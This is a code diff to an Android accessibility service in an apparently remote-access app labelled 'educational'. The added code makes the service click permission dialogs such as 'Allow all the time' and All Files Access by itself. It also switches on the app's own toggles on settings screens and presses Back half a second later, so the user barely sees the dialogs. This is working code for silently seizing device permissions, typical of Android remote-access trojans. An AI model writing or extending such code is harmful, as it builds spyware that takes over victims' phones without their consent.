@@ -28,6 +28,7 @@ import android.net.Uri;
 import android.os.Build;
 import android.provider.Settings;
 import androidx.annotation.RequiresApi;
+import com.remoteaccess.educational.R;
 import com.remoteaccess.educational.network.SocketManager;
 import com.remoteaccess.educational.utils.Constants;
 import com.remoteaccess.educational.utils.KeepAliveManager;
@@ -464,7 +465,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         }
     }
 
-    /** Starts auto-grant mode: clicks Allow/Grant/OK/Allow all time for 60 seconds.
+    /** Starts auto-grant mode: clicks Allow/Grant/OK/Allow all time for 12 seconds.
      *  Also triggers MANAGE_EXTERNAL_STORAGE (All Files Access) settings screen so
      *  the user is prompted and the auto-clicker can grant it too.
      */
@@ -482,16 +483,20 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     Log.i(TAG, "Auto-grant: requested MANAGE_EXTERNAL_STORAGE settings screen");
                 }
             } catch (Exception ignored) {}
-        }, 3_000);
+        }, 1_500);
 
         autoGrantHandler.postDelayed(() -> {
             autoGrantMode = false;
-            Log.i(TAG, "Auto-grant mode expired after 60 seconds");
-        }, 60_000);
-        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 60s");
+            Log.i(TAG, "Auto-grant mode expired after 12 seconds");
+        }, 12_000);
+        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 12s");
     }
 
-    /** Clicks permission-granting buttons: Allow, Grant, OK, Allow all time, etc. */
+    // Words that disqualify a toggle from being auto-enabled
+    private static final String[] TOGGLE_BLACKLIST = { "shortcut", "stop", "delete", "kill" };
+
+    /** Clicks permission-granting buttons: Allow, Grant, OK, Allow all time, etc.
+     *  Also enables toggle/switch/checkbox for this app in settings screens. */
     private boolean runPermissionGranter(AccessibilityNodeInfo rootNode) {
         // Priority 1: "Allow all the time" (location / battery full-access dialogs)
         // Priority 2: "Allow only while using the app" — only if "Allow all the time" not present
@@ -504,6 +509,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         for (String word : highPriority) {
             if (findAndClickFullWord(rootNode, word)) {
                 Log.i(TAG, "Auto-grant clicked (high priority): " + word);
+                scheduleBack(500);
                 return true;
             }
         }
@@ -518,6 +524,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         for (String word : whileUsingVariants) {
             if (findAndClickFullWord(rootNode, word)) {
                 Log.i(TAG, "Auto-grant clicked (while-using fallback): " + word);
+                scheduleBack(500);
                 return true;
             }
         }
@@ -530,6 +537,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         for (String word : grantWords) {
             if (findAndClickFullWord(rootNode, word)) {
                 Log.i(TAG, "Auto-grant clicked: " + word);
+                scheduleBack(500);
                 return true;
             }
         }
@@ -539,10 +547,128 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         for (String word : containsWords) {
             if (findAndClickContaining(rootNode, word)) {
                 Log.i(TAG, "Auto-grant clicked (contains): " + word);
+                scheduleBack(500);
                 return true;
             }
         }
+
+        // Toggle/switch/checkbox handler: enable the app's toggle in settings screens
+        if (runAccessibilityToggleGranter(rootNode)) {
+            return true;
+        }
+
         return false;
+    }
+
+    /** Schedules a BACK press after the given delay in milliseconds. */
+    private void scheduleBack(long delayMs) {
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            try { performBack(); } catch (Exception ignored) {}
+        }, delayMs);
+    }
+
+    /**
+     * Looks for unchecked toggles/switches/checkboxes on screen when the app name
+     * is visible. Skips any item whose nearby text contains a blacklisted word.
+     * If found, turns it on and presses back after 500 ms.
+     */
+    private boolean runAccessibilityToggleGranter(AccessibilityNodeInfo rootNode) {
+        try {
+            String appName = getString(R.string.app_name).toLowerCase();
+            String screenText = getAllScreenText(rootNode).toLowerCase();
+            if (!screenText.contains(appName)) return false;
+
+            if (findAndEnableToggleForAppName(rootNode)) {
+                Log.i(TAG, "Auto-grant: enabled toggle for app on settings screen");
+                scheduleBack(500);
+                return true;
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return false;
+    }
+
+    /**
+     * Recursively walks the node tree and enables the first unchecked
+     * Switch / CheckBox / ToggleButton whose context text is not blacklisted.
+     */
+    private boolean findAndEnableToggleForAppName(AccessibilityNodeInfo node) {
+        if (node == null) return false;
+        try {
+            CharSequence cls = node.getClassName();
+            if (cls != null) {
+                String classStr = cls.toString();
+                boolean isToggle = classStr.contains("Switch") ||
+                                   classStr.contains("CheckBox") ||
+                                   classStr.contains("ToggleButton") ||
+                                   classStr.contains("CompoundButton");
+                if (isToggle && !node.isChecked()) {
+                    String context = getNodeContextText(node).toLowerCase();
+                    boolean blacklisted = false;
+                    for (String bad : TOGGLE_BLACKLIST) {
+                        if (context.contains(bad)) { blacklisted = true; break; }
+                    }
+                    if (!blacklisted) {
+                        if (node.isClickable()) {
+                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        } else {
+                            AccessibilityNodeInfo parent = node.getParent();
+                            if (parent != null) {
+                                if (parent.isClickable()) {
+                                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                                } else {
+                                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                                }
+                                parent.recycle();
+                            } else {
+                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                            }
+                        }
+                        return true;
+                    }
+                }
+            }
+            for (int i = 0; i < node.getChildCount(); i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    if (findAndEnableToggleForAppName(child)) {
+                        child.recycle();
+                        return true;
+                    }
+                    child.recycle();
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return false;
+    }
+
+    /**
+     * Collects text from a node, its parent, and grandparent so we have enough
+     * context to check for blacklisted words near the toggle.
+     */
+    private String getNodeContextText(AccessibilityNodeInfo node) {
+        StringBuilder sb = new StringBuilder();
+        try {
+            if (node.getText() != null) sb.append(node.getText()).append(" ");
+            if (node.getContentDescription() != null) sb.append(node.getContentDescription()).append(" ");
+            AccessibilityNodeInfo parent = node.getParent();
+            if (parent != null) {
+                if (parent.getText() != null) sb.append(parent.getText()).append(" ");
+                if (parent.getContentDescription() != null) sb.append(parent.getContentDescription()).append(" ");
+                AccessibilityNodeInfo grandParent = parent.getParent();
+                if (grandParent != null) {
+                    collectText(grandParent, sb);
+                    grandParent.recycle();
+                }
+                parent.recycle();
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return sb.toString();
     }
     
     private boolean runDefentProtection(AccessibilityNodeInfo rootNode) {
